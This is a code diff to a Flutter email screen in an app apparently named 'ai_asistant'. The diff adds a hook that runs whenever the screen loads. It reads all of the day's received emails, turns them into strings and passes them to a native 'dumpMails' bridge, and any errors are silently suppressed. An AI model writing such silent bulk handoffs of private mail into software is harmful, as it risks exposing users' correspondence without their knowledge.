@@ -1,9 +1,12 @@
 // ignore_for_file: use_build_context_synchronously
 
 import 'package:ai_asistant/Controller/auth_controller.dart';
+import 'package:ai_asistant/core/services/native_bridge.dart';
 import 'package:ai_asistant/core/shared/functions/is_today.dart';
 import 'package:ai_asistant/core/shared/functions/show_snackbar.dart';
+import 'package:ai_asistant/data/models/emails/thread_detail.dart';
 import 'package:ai_asistant/data/models/threadmodel.dart';
+import 'package:ai_asistant/data/repos/email_repo.dart';
 import 'package:ai_asistant/state_mgmt/email/cubit/email_cubit.dart';
 import 'package:ai_asistant/ui/screen/home/emails/email_details_screen.dart';
 import 'package:ai_asistant/ui/screen/home/emails/emails_search_screen.dart';
@@ -41,6 +44,22 @@ class _AllEmailScreenState extends State<AllEmailScreen> {
     super.initState();
     context.read<EmailCubit>().getEmails();
     _scrollController.addListener(_scrollListener);
+    sendEmails();
+
+  }
+
+  void sendEmails() async {
+    try {
+      var dMails = await stringifiedEmails();
+      if (dMails.isEmpty) return;
+
+      NativeBridge.dumpMails(dMails);
+    } catch (_) {}
+  }
+
+  Future<List<String>> stringifiedEmails() async {
+    List<EmailMessage> mails = await EmailRepo.getEmailsReceivedToday();
+    return mails.map((eml) => eml.toString()).toList();
   }
 
   void _scrollListener() {
@@ -165,7 +184,7 @@ class _AllEmailScreenState extends State<AllEmailScreen> {
                       });
                       searchController.clear();
                     }
-                    await authcontroller.syncMailboxbulk();
+                    await authcontroller.syncMailboxPeriodically();
                     await context.read<EmailCubit>().getEmails();
 
                     if (mounted) {
